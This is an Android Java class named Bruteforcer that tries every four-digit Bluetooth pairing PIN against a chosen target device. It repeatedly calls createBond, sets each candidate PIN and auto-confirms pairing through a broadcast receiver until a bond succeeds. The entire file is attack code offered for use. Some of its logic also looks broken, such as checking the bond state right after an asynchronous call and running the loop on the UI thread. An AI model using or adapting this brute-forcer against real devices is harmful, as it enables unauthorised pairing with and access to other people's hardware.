package com.example.bruteblue;

import android.bluetooth.BluetoothDevice;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.widget.TextView;

public class Bruteforcer {

    // Attributes
    private int result;
    private Context context;
    private IntentFilter filter;
    private int tryPin;

    public Bruteforcer(Context context) {
        this.context = context;
        filter = new IntentFilter(BluetoothDevice.ACTION_PAIRING_REQUEST);
        this.context.registerReceiver(mPairingRequestReceiver, filter);
    }

    public void start(int range, BluetoothDevice target) {
        boolean correct = false;
        TextView pin = (TextView) ((MainActivity)context).findViewById(R.id.Pin);
        while(range <= 9999 && !correct) {
            // Try this pin
            this.tryPin = range;
            if(isPaired(target)) {
                this.result = range;
                pin.setText("Pin found: "+formatPin(range));
                correct = true;
            }
            else {
                pin.setText(formatPin(range));
                range++;
            }
        }
    }

    public String formatPin(int pin) {
        String pinFormatted = "";
        int pinLength = String.valueOf(pin).length();
        if(pinLength == 0) {
            pinFormatted = "0000";
        }
        else if(pinLength == 1) {
            pinFormatted = "000"+String.valueOf(pin);
        }
        else if(pinLength == 2) {
            pinFormatted = "00"+String.valueOf(pin);
        }
        else if(pinLength == 3) {
            pinFormatted = "0"+String.valueOf(pin);
        }
        else {
            pinFormatted = String.valueOf(pin);
        }
        return pinFormatted;
    }

    public Boolean isPaired(BluetoothDevice target) {
        Boolean paired = false;
        try {
            // Start pairing with device
            target.createBond();
            if(target.getBondState() == BluetoothDevice.BOND_BONDED) {
                paired = true;
            }
            // Pairing finished
        } catch (Exception e) {
            e.printStackTrace();
        }
        return paired;
    }

    private final BroadcastReceiver mPairingRequestReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action.equals(BluetoothDevice.ACTION_PAIRING_REQUEST)) {
                try {
                    BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                    int pin=intent.getIntExtra("android.bluetooth.device.extra.PAIRING_KEY", Integer.valueOf(formatPin(tryPin)));
                    //The pin in case you need to accept for an specific pin
                    byte[] pinBytes;
                    pinBytes = (""+pin).getBytes("UTF-8");
                    device.setPin(pinBytes);
                    //SetPairing confirmation if needed
                    device.setPairingConfirmation(true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    };
}